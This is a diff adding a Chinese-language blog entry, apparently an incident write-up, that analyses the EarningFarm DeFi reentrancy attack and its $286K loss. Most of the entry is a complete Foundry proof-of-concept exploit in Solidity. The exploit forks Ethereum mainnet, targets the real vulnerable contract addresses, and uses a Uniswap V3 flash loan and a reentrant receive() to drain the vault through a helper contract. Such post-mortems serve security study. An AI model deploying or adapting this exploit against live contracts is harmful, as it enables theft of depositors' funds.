@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>EarningFram</title>
+      <link href="/2023/10/03/20230809-EarningFram/"/>
+      <url>/2023/10/03/20230809-EarningFram/</url>
+      
+        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>EarningFram被攻击，损失$286K。（EarningFarm项目通过吸收用户资金去投资Aave，得到收益，用户在存入ETH，得到share）</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过<a href="https://explorer.phalcon.xyz/tx/eth/0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fa?line=686">phalcon</a>来分析。</p><p>我们能发现在withdraw中，当触发攻击合约的fallback()方法时，在fallback中将share转给另一个被攻击者控制的地址。(又没用检查-影响-交互模式！！！)</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>pragma solidity ^0.8.10;import "forge-std/Test.sol";import "./interface.sol";// Vulnerable Contract : https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e// Attack Tx : 0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fainterface IENF_ETHLEV is IERC20 {    function deposit(uint256 assets, address receiver) external payable returns (uint256);    function withdraw(uint256 assets, address receiver) external returns (uint256);    function convertToAssets(uint256 shares) external view returns (uint256);    function totalAssets() external view returns (uint256);}contract ContractTest is Test {    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));    Uni_Pair_V3 Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);    address Controller = 0xE8688D014194fd5d7acC3c17477fD6db62aDdeE9;    Exploiter exploiter;    uint256 nonce;    function setUp() public {        vm.createSelectFork("mainnet", 17_875_885);        vm.label(address(WETH), "WETH");        vm.label(address(ENF_ETHLEV), "ENF_ETHLEV");        vm.label(address(Pair), "Piar");        exploiter = new Exploiter();    }    function testExploit() external {        while (ENF_ETHLEV.totalAssets() &gt; 1 ether) {            deal(address(this), 0);            Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));            emit log_named_decimal_uint(                "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()                );        }    }    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {        WETH.withdraw(WETH.balanceOf(address(this)));        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);        uint256 assets = ENF_ETHLEV.totalAssets();        ENF_ETHLEV.deposit{value: assets}(assets, address(this)); // deposit eth, mint shares        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));        ENF_ETHLEV.withdraw(assetsAmount, address(this)); // withdraw all assets, burn small shares by reentracny, re-enter point        exploiter.withdraw(); // withdraw all assets        WETH.deposit{value: address(this).balance}();        uint256 amount = abi.decode(data, (uint256));        WETH.transfer(address(Pair), amount1 + amount);    }    receive() external payable {        if (msg.sender == Controller) {            ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)) - 1);            nonce++;        }    }}contract Exploiter {    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);    function withdraw() external {        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));        ENF_ETHLEV.withdraw(assetsAmount, address(this));        payable(msg.sender).transfer(address(this).balance);    }    receive() external payable {}}</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 攻击事件 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MetaTrust</title>
       <link href="/2023/10/03/MetaTrust/"/>
       <url>/2023/10/03/MetaTrust/</url>
